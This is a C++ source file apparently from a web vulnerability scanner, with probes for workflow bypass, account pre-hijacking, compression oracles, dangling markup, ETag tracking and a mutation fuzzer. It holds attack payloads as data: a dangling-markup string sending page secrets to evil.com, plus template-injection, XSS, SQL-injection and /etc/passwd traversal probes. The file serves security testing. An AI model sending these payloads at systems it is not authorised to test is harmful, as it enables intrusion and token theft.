/// @file scanners/advanced_auth.cpp
/// @brief Advanced auth scanners: workflow bypass, account pre-hijacking,
///        compression oracle, dangling markup, etag tracking, mutation fuzzer.
#include "scanner_base.hpp"
#include <chrono>
#include <set>

namespace apex {
namespace {

/// Scanner implementation.
std::vector<Finding> scan_workflow_bypass(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  struct Step { const char *skip; const char *final_; };
  const Step steps[] = {
      {"/checkout/step1", "/checkout/step3"},
      {"/register/verify", "/register/complete"},
      {"/payment/init", "/payment/confirm"},
      {"/onboarding/step1", "/onboarding/complete"},
  };

  // Iterate over targets.
  for (const auto &s : steps) {
    auto resp = http.get(base + s.final_);
    if (resp.status_code == 200 && resp.body.size() > 100 &&
        resp.body.find("redirect") == std::string::npos &&
        resp.body.find("unauthorized") == std::string::npos) {
      findings.push_back({"Workflow Step Bypass", "high", base + s.final_,
                          std::string("Final step accessible without completing ") + s.skip,
                          "", "", ""});
    }
  }
  return findings;
}

/// Scanner implementation.
std::vector<Finding> scan_account_prehijack(const Config &, HttpClient &http,
                                            const CrawlResult &crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> paths = {
      "/register", "/signup", "/api/register", "/api/auth/register"};

  // Iterate over targets.
  for (const auto &path : paths) {
    auto resp = http.post(base + path,
                          R"({"email":"prehijack@test.com","password":"Test123!"})",
                          "application/json");
    if (resp.status_code == 200 &&
        resp.body.find("verify") == std::string::npos &&
        resp.body.find("confirm") == std::string::npos) {
      findings.push_back({"Account Pre-Hijacking Risk", "medium", base + path,
                          "Registration succeeds without email verification", "", "", ""});
    }
  }
  return findings;
}

/// Scanner implementation.
std::vector<Finding> scan_server_timing(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  size_t limit = std::min(crawl.urls.size(), size_t(5));
  for (size_t i = 0; i < limit; ++i) {
    auto resp = http.get(crawl.urls[i]);
    auto it = resp.headers.find("Server-Timing");
    if (it != resp.headers.end() &&
        (it->second.find("db") != std::string::npos ||
         it->second.find("cache") != std::string::npos ||
         it->second.find("app") != std::string::npos)) {
      findings.push_back({"Server-Timing Header Leaks Internal Metrics", "low",
                          crawl.urls[i], "Server-Timing: " + it->second, "", "", ""});
    }
  }
  return findings;
}

/// Scanner implementation.
std::vector<Finding> scan_compression_oracle(const Config &, HttpClient &http,
                                             const CrawlResult &crawl) {
  std::vector<Finding> findings;
  size_t limit = std::min(crawl.urls.size(), size_t(5));
  for (size_t i = 0; i < limit; ++i) {
    auto resp = http.get(crawl.urls[i]);
    auto it = resp.headers.find("Content-Encoding");
    if (it != resp.headers.end() &&
        (it->second == "gzip" || it->second == "br" || it->second == "deflate") &&
        resp.body.find("csrf") != std::string::npos) {
      findings.push_back({"BREACH/Compression Oracle Risk", "low", crawl.urls[i],
                          "Response compressed (" + it->second + ") and contains CSRF token",
                          "", "", ""});
      break;
    }
  }
  return findings;
}

/// Scanner implementation.
std::vector<Finding> scan_dangling_markup(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  std::string payload = R"("><img src='https://evil.com/steal?)";

  // Iterate over targets.
  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url);
    for (const auto &[base, param] : targets) {
      auto resp = http.get(base + payload);
      if (resp.body.find("evil.com/steal?") != std::string::npos) {
        size_t idx = resp.body.find("evil.com/steal?");
        size_t end = std::min(idx + 100, resp.body.size());
        std::string captured = resp.body.substr(idx, end - idx);
        if (captured.find("token") != std::string::npos ||
            captured.find("csrf") != std::string::npos ||
            captured.find("session") != std::string::npos) {
          findings.push_back({"Dangling Markup Injection", "high", base + payload,
                              "Injected markup captures secrets", param, payload, ""});
        }
      }
    }
  }
  return findings;
}

/// Scanner implementation.
std::vector<Finding> scan_etag_tracking(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  if (crawl.urls.empty()) return findings;
  auto resp = http.get(crawl.urls[0]);
  auto it = resp.headers.find("ETag");
  if (it != resp.headers.end() && it->second.size() > 20) {
    findings.push_back({"ETag Tracking", "info", crawl.urls[0],
                        "Long ETag may be used for user tracking: " + it->second,
                        "", "", ""});
  }
  return findings;
}

/// Scanner implementation.
std::vector<Finding> scan_mutation_fuzzer(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
  std::vector<Finding> findings;
  struct Mutation { const char *suffix; const char *detect; };
  const Mutation mutations[] = {
      {"{{7*7}}", "49"},
      {"${7*7}", "49"},
      {"<svg onload=alert(1)>", "onload=alert"},
      {"' OR '1'='1", "sql"},
      {"../../../etc/passwd", "root:"},
  };

  // Iterate over targets.
  for (const auto &url : crawl.urls) {
    auto base_resp = http.get(url);
    auto targets = get_targets(crawl, url);
    for (const auto &[base, param] : targets) {
      for (const auto &m : mutations) {
        if (base_resp.body.find(m.detect) != std::string::npos) continue;
        auto resp = http.get(base + m.suffix);
        if (resp.body.find(m.detect) != std::string::npos) {
          findings.push_back({"Mutation Fuzzer Hit", "high", base + m.suffix,
                              std::string("Payload '") + m.suffix + "' triggered detection",
                              param, m.suffix, m.detect});
          break;
        }
      }
    }
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_advanced_auth_scanners() {
  return {
      {"Workflow Bypass", scan_workflow_bypass},
      {"Account Pre-Hijack", scan_account_prehijack},
      {"Server-Timing Leak", scan_server_timing},
      {"Compression Oracle", scan_compression_oracle},
      {"Dangling Markup", scan_dangling_markup},
      {"ETag Tracking", scan_etag_tracking},
      {"Mutation Fuzzer", scan_mutation_fuzzer},
  };
}

} // namespace apex
